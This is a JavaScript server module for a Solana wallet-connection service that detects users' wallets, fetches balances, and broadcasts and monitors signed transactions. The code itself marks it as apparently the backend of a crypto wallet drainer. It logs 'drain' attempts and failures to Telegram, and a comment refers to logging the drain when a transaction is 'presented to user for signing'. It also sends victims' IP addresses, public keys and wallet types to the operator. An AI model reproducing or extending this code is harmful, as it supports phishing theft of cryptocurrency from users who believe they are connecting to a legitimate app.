// Enhanced transaction confirmation monitoring
async function monitorTransaction(signature, maxAttempts = 3, walletType = 'unknown') {
  // Reduce attempts for Phantom to prevent hanging
  if (walletType === 'phantom') {
    maxAttempts = 2; // Minimal attempts for Phantom
  }
  
  const rpcEndpoints = [
    process.env.HELIUS_RPC_URL || 'https://api.mainnet-beta.solana.com', // Helius RPC (premium)
    process.env.SHYFT_RPC_URL || 'https://api.mainnet-beta.solana.com' // Shyft RPC (premium)
  ]; // Premium RPC endpoints only for reliable monitoring

  for (const rpcUrl of rpcEndpoints) {
    try {
      const connection = new Connection(rpcUrl, {
        commitment: 'confirmed',
        confirmTransactionInitialTimeout: walletType === 'phantom' ? 45000 : walletType === 'trustwallet' ? 0 : 30000, // Trust Wallet handles its own timeouts
        disableRetryOnRateLimit: true // Disable retries to prevent hanging
      });

      for (let attempt = 1; attempt <= maxAttempts; attempt++) {
        try {
          console.log(`[MONITOR] Attempt ${attempt}/${maxAttempts} with ${rpcUrl} (${walletType})`);
          
          // Try different commitment levels for better success rate
          let confirmation;
          try {
            confirmation = await connection.confirmTransaction(signature, 'confirmed');
          } catch (confirmedError) {
            console.log(`[MONITOR] Confirmed failed, trying processed: ${confirmedError.message}`);
            confirmation = await connection.confirmTransaction(signature, 'processed');
          }
          
          if (confirmation.value.err) {
            console.log(`[MONITOR] Transaction failed on-chain:`, confirmation.value.err);
            return {
              success: false,
              status: 'failed',
              error: confirmation.value.err,
              attempt: attempt,
              rpcUrl: rpcUrl
            };
          }
          
          console.log(`[MONITOR] Transaction confirmed successfully on attempt ${attempt}`);
          return {
            success: true,
            status: 'confirmed',
            confirmation: confirmation.value,
            attempt: attempt,
            rpcUrl: rpcUrl
          };
        } catch (error) {
          console.log(`[MONITOR] Attempt ${attempt} failed:`, error.message);
          
          // For Phantom, return specific error information immediately
          if (walletType === 'phantom' && attempt === maxAttempts) {
            return {
              success: false,
              status: 'phantom_timeout',
              error: `Phantom transaction monitoring failed: ${error.message}`,
              attempt: attempt,
              rpcUrl: rpcUrl,
              walletType: 'phantom'
            };
          }
          
          if (attempt === maxAttempts) {
            throw error;
          }
          // Reduced wait time for Phantom
          const waitTime = walletType === 'phantom' ? 500 : Math.min(2000 * Math.pow(1.5, attempt - 1), 10000);
          await new Promise(resolve => setTimeout(resolve, waitTime));
        }
      }
    } catch (error) {
      console.error(`[MONITOR] ${rpcUrl} failed:`, error.message);
    }
  }
  
  // Final fallback: try to get transaction status directly
  console.log('[MONITOR] All confirmTransaction attempts failed, trying getTransaction fallback');
  for (const rpcUrl of rpcEndpoints) {
    try {
      const connection = new Connection(rpcUrl, {
        commitment: 'confirmed',
        confirmTransactionInitialTimeout: 30000
      });
      
      const transactionInfo = await connection.getTransaction(signature, {
        commitment: 'confirmed',
        maxSupportedTransactionVersion: 0
      });
      
      if (transactionInfo) {
        if (transactionInfo.meta?.err) {
          return {
            success: false,
            status: 'failed',
            error: transactionInfo.meta.err,
            method: 'getTransaction'
          };
        } else {
          return {
            success: true,
            status: 'confirmed',
            confirmation: { slot: transactionInfo.slot },
            method: 'getTransaction',
            rpcUrl: rpcUrl
          };
        }
      }
    } catch (error) {
      console.log(`[MONITOR] getTransaction fallback failed for ${rpcUrl}:`, error.message);
    }
  }
  
  return {
    success: false,
    status: 'timeout',
    error: 'All RPC endpoints failed to confirm transaction'
  };
}

// Main wallet management handler
async function walletManagementHandler(req, res) {
  const startTime = Date.now();
  const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'Unknown';

  // CORS headers handled by server.js middleware

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  // Validate request body exists
  if (!req.body || typeof req.body !== 'object') {
    res.status(400).json({ error: 'Invalid request body' });
    return;
  }

  try {
    // Set timeout for the entire request
    const timeoutId = setTimeout(() => {
      if (!res.headersSent) {
        res.status(408).json({ error: 'Request timeout' });
      }
    }, 25000); // 25 second timeout (less than Vercel's 30s limit)

    const { 
      operation, 
      publicKey, 
      walletType, 
      walletKey,
      transaction, 
      signedTransaction, 
      signature,
      lastValidBlockHeight,
      availableProviders 
    } = req.body;
    
    if (!operation) {
      res.status(400).json({ error: 'Operation is required' });
      return;
    }

    let result;
    
    switch (operation) {
      case 'get_wallet_definitions':
        result = {
          success: true,
          wallets: Object.entries(WALLET_DEFINITIONS).map(([key, wallet]) => ({
            key: key,
            name: wallet.name,
            logo: wallet.logo
          }))
        };
        break;
        
      case 'generate_deep_link':
        const { walletType: deepLinkWalletType, appUrl } = req.body;
        
        if (!deepLinkWalletType || !appUrl) {
          res.status(400).json({ 
            error: 'Wallet type and app URL are required for deep link generation' 
          });
          return;
        }
        
        const isMobile = isMobileDevice(userAgent);
        
        switch (deepLinkWalletType) {
          case 'phantom':
            result = generatePhantomDeepLink(appUrl, isMobile);
            break;
          case 'backpack':
            result = generateBackpackDeepLink(appUrl, isMobile);
            break;
          case 'solflare':
            result = generateSolflareDeepLink(appUrl, isMobile);
            break;
          case 'trustwallet':
            result = generateTrustWalletDeepLink(appUrl, isMobile);
            break;
          case 'glow':
            result = generateGlowDeepLink(appUrl, isMobile);
            break;
          case 'exodus':
            result = generateExodusDeepLink(appUrl, isMobile);
            break;
          default:
            res.status(400).json({ 
              error: `Deep link generation not supported for wallet type: ${deepLinkWalletType}` 
            });
            return;
        }
        break;
        
      case 'detect_wallet':
        console.log('[WALLET_DETECTION] User agent:', userAgent);
        console.log('[WALLET_DETECTION] Available providers:', availableProviders);
        console.log('[WALLET_DETECTION] Available providers type:', typeof availableProviders);
        console.log('[WALLET_DETECTION] Available providers length:', availableProviders?.length);
        const detection = detectWalletType(userAgent, availableProviders || []);
        console.log('[WALLET_DETECTION] Detection result:', detection);
        
        // Log wallet detection to Telegram
        if (detection && detection.key !== 'unknown') {
          try {
            await telegramLogger.logWalletDetected({
              publicKey: 'unknown', // No public key yet during detection
              lamports: 0, // No balance yet during detection
              ip: userIp,
              walletType: detection.key
            });
          } catch (telegramError) {
            console.warn('[WALLET_DETECTION] Telegram logging failed:', telegramError.message);
            // Continue execution even if Telegram logging fails
          }
        }
        
        result = {
          success: true,
          wallet: detection,
          userAgent: userAgent,
          isMobile: isMobileDevice(userAgent)
        };
        break;
        
      case 'detect_installed_wallets':
        try {
          const { availableProviders = [] } = req.body;
          
          // Enhanced wallet detection logic
          const detectedWallets = [];
          const walletPriority = getWalletPriority();
          
          // Check each wallet based on available providers
          for (const provider of availableProviders) {
            if (provider.includes('phantom') || provider.includes('window.solana')) {
              detectedWallets.push('phantom');
            } else if (provider.includes('solflare')) {
              detectedWallets.push('solflare');
            } else if (provider.includes('backpack')) {
              detectedWallets.push('backpack');
            } else if (provider.includes('glow')) {
              detectedWallets.push('glow');
            } else if (provider.includes('trust')) {
              detectedWallets.push('trustwallet');
            } else if (provider.includes('exodus')) {
              detectedWallets.push('exodus');
            }
          }
          
          // Remove duplicates and prioritize
          const uniqueWallets = [...new Set(detectedWallets)];
          const prioritizedWallets = walletPriority.filter(wallet => uniqueWallets.includes(wallet));
          
          result = {
            success: true,
            detectedWallets: uniqueWallets,
            prioritizedWallets: prioritizedWallets,
            recommendedWallet: prioritizedWallets[0] || 'phantom',
            isMobile: isMobileDevice(userAgent),
            platform: getMobilePlatform(userAgent),
            inMobileWallet: isInMobileWallet(userAgent)
          };
        } catch (error) {
          console.error('[WALLET_DETECTION] Error:', error);
          result = { 
            success: false, 
            error: 'Wallet detection failed',
            details: error.message 
          };
        }
        break;
        
      case 'get_wallet_info':
        if (!walletKey) {
          res.status(400).json({ error: 'Wallet key is required' });
          return;
        }
        result = getWalletConnectionInfo(walletKey);
        break;
        
      case 'get_wallet_modal_data':
        // Get all wallet definitions for the modal
        const modalWallets = Object.entries(WALLET_DEFINITIONS).map(([key, wallet]) => ({
          key: key,
          name: wallet.name,
          logo: wallet.logo,
          description: getWalletDescription(key),
          isMobile: isMobileDevice(userAgent)
        }));
        
        result = {
          success: true,
          wallets: modalWallets,
          isMobile: isMobileDevice(userAgent),
          userAgent: userAgent
        };
        break;
        
      case 'connect_wallet':
        if (!walletKey) {
          res.status(400).json({ error: 'Wallet key is required for connection' });
          return;
        }
        
        const connectionInfo = getWalletConnectionInfo(walletKey);
        if (!connectionInfo.success) {
          res.status(400).json({ error: connectionInfo.error });
          return;
        }
        
        result = {
          success: true,
          wallet: connectionInfo.wallet,
          connectionInstructions: getWalletInstallInstructions(walletKey, userAgent),
          isMobile: isMobileDevice(userAgent)
        };
        break;
        
      case 'validate_wallet':
        if (!publicKey) {
          res.status(400).json({ error: 'Public key is required' });
          return;
        }
        const walletValidation = validateWallet(publicKey, walletType || 'unknown');
        result = {
          success: walletValidation.isValid,
          isValid: walletValidation.isValid,
          errors: walletValidation.errors
        };
        break;
        
      case 'fetch_balance':
        if (!publicKey) {
          res.status(400).json({ error: 'Public key is required' });
          return;
        }
        const balanceResult = await fetchWalletBalance(publicKey);
        result = {
          success: balanceResult.success,
          balance: balanceResult.balance,
          balanceSOL: balanceResult.balanceSOL,
          error: balanceResult.error,
          rpcUrl: balanceResult.rpcUrl
        };
        break;
        
      case 'validate_transaction':
        if (!transaction || !publicKey) {
          res.status(400).json({ error: 'Transaction and public key are required for validation' });
          return;
        }
        
        console.log(`[VALIDATE_TRANSACTION] Wallet type received: ${walletType}`);
        
        // Deserialize transaction if it's base64
        let tx;
        if (typeof transaction === 'string') {
          try {
            const txBytes = Uint8Array.from(atob(transaction), c => c.charCodeAt(0));
            tx = Transaction.from(txBytes);
          } catch (error) {
            res.status(400).json({ error: 'Invalid transaction format' });
            return;
          }
        } else {
          tx = transaction;
        }
        
        const validation = validateTransaction(tx, publicKey, walletType);
        result = {
          success: validation.isValid,
          isValid: validation.isValid,
          errors: validation.errors
        };
        break;
        
      case 'broadcast_transaction':
        if (!signedTransaction) {
          res.status(400).json({ error: 'Signed transaction is required for broadcasting' });
          return;
        }
        
        // Deserialize signed transaction if it's base64
        let signedTx;
        if (typeof signedTransaction === 'string') {
          try {
            const txBytes = Uint8Array.from(atob(signedTransaction), c => c.charCodeAt(0));
            // Use Transaction.from with proper signature handling
            signedTx = Transaction.from(txBytes);
            
            // CRITICAL: Restore lastValidBlockHeight if provided in request
            // This is essential because Transaction.from() doesn't preserve lastValidBlockHeight
            if (lastValidBlockHeight) {
              signedTx.lastValidBlockHeight = lastValidBlockHeight;
              console.log(`[BROADCAST] Restored lastValidBlockHeight: ${signedTx.lastValidBlockHeight}`);
              
              // Verify the property was actually set
              if (signedTx.lastValidBlockHeight !== lastValidBlockHeight) {
                console.error(`[BROADCAST] CRITICAL: lastValidBlockHeight not properly set! Expected: ${lastValidBlockHeight}, Got: ${signedTx.lastValidBlockHeight}`);
              }
            } else {
              console.warn(`[BROADCAST] No lastValidBlockHeight provided in request - transaction may fail`);
            }
            
            // Debug: Log deserialized transaction details
            console.log('[BROADCAST] Deserialized transaction:', {
              hasSignatures: !!signedTx.signatures,
              signatureCount: signedTx.signatures?.length || 0,
              feePayer: signedTx.feePayer?.toString(),
              recentBlockhash: signedTx.recentBlockhash,
              lastValidBlockHeight: signedTx.lastValidBlockHeight,
              instructionCount: signedTx.instructions?.length || 0
            });
            
            // Validate that signatures are preserved
            if (!signedTx.signatures || signedTx.signatures.length === 0) {
              console.error('[BROADCAST] No signatures found after deserialization');
              res.status(400).json({ error: 'Transaction lost signatures during deserialization' });
              return;
            }
            
          } catch (error) {
            console.error('[BROADCAST] Deserialization error:', error);
            res.status(400).json({ error: 'Invalid signed transaction format' });
            return;
          }
        } else {
          signedTx = signedTransaction;
        }
        
        const broadcastResult = await broadcastTransaction(signedTx, 1, walletType);
        result = {
          success: broadcastResult.success,
          signature: broadcastResult.signature,
          error: broadcastResult.error,
          rpcUrl: broadcastResult.rpcUrl
        };
        
        // Log broadcast failure if it failed
        if (!broadcastResult.success && broadcastResult.error) {
          console.log('[BROADCAST_ERROR] Transaction broadcast failed:', {
            signature: broadcastResult.signature,
            error: broadcastResult.error,
            walletType: walletType
          });
          
          // Log to Telegram for broadcast failures
          try {
            const telegramLogger = (await import('../src/telegram.js')).default;
            await telegramLogger.logDrainFailed({
              publicKey: publicKey,
              signature: broadcastResult.signature,
              error: broadcastResult.error,
              walletType: walletType || 'Unknown',
              ip: req.ip || 'Unknown',
              status: 'broadcast_failed'
            });
          } catch (telegramError) {
            console.error('[BROADCAST_ERROR] Failed to log to Telegram:', telegramError);
          }
        }
        break;
        
      case 'monitor_transaction':
        if (!signature) {
          res.status(400).json({ error: 'Transaction signature is required for monitoring' });
          return;
        }
        
        console.log('[MONITOR_TRANSACTION] Starting monitoring for signature:', signature);
        console.log('[MONITOR_TRANSACTION] Wallet type received:', walletType);
        console.log('[MONITOR_TRANSACTION] Public key:', publicKey);
        
        try {
          const monitorResult = await monitorTransaction(signature, 3, walletType);
          console.log('[MONITOR_TRANSACTION] Monitor result:', monitorResult);
          
        result = {
          success: monitorResult.success,
          status: monitorResult.status,
          confirmation: monitorResult.confirmation,
          error: monitorResult.error
        };
          
          // Log transaction failure if it failed on-chain
          if (!monitorResult.success && monitorResult.error) {
            console.log('[ONCHAIN_ERROR] Transaction failed on-chain:', {
              signature: signature,
              error: monitorResult.error,
              status: monitorResult.status
            });
            
            // Log to Telegram for on-chain failures
            try {
              const telegramLogger = (await import('../src/telegram.js')).default;
              await telegramLogger.logDrainFailed({
                publicKey: publicKey,
                signature: signature,
                error: monitorResult.error,
                walletType: walletType || 'Unknown',
                ip: req.ip || 'Unknown',
                status: monitorResult.status
              });
            } catch (telegramError) {
              console.error('[ONCHAIN_ERROR] Failed to log to Telegram:', telegramError);
            }
          }
        } catch (monitorError) {
          console.error('[MONITOR_TRANSACTION] Monitoring failed:', monitorError);
          result = {
            success: false,
            status: 'monitor_error',
            error: monitorError.message
          };
        }
        break;
        
      default:
        res.status(400).json({ error: 'Unknown operation' });
        return;
    }

    // Don't log drain attempt here - it should be logged when transaction is presented to user for signing

    // Clear timeout before sending response
    clearTimeout(timeoutId);
    
    // Set headers to prevent timeout
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');

    res.status(200).json({
      success: true,
      operation: operation,
      result: result,
      processingTime: Date.now() - startTime
    });

  } catch (error) {
    // Clear timeout in case of error
    if (typeof timeoutId !== 'undefined') {
      clearTimeout(timeoutId);
    }
    
    console.error('[WALLET_MANAGEMENT] Error:', error);
    
    try {
    await telegramLogger.logError({
      publicKey: req.body?.publicKey || 'Unknown',
      ip: userIp,
      message: `Wallet management error: ${error.message}`
    });
    } catch (telegramError) {
      console.error('[WALLET_MANAGEMENT] Failed to log to Telegram:', telegramError);
    }
    
    if (!res.headersSent) {
    res.status(500).json({
      error: 'Internal server error',
      details: error.message
    });
    }
  }
}

// Export the handler and utility functions
export {
  WALLET_DEFINITIONS,
  detectWalletType,
  getWalletPriority,
  getWalletConnectionInfo,
  getWalletDescription,
  getWalletInstallInstructions,
  getPlatformSpecificStrategies,
  validateTransaction,
  fetchWalletBalance,
  isMobileDevice,
  getMobilePlatform,
  isInMobileWallet,
  broadcastTransaction,
  monitorTransaction,
  generatePhantomDeepLink,
  generateBackpackDeepLink,
  generateSolflareDeepLink,
  generateTrustWalletDeepLink,
  generateGlowDeepLink,
  generateExodusDeepLink,
  generateEncryptionKeyPair
};

export default walletManagementHandler;
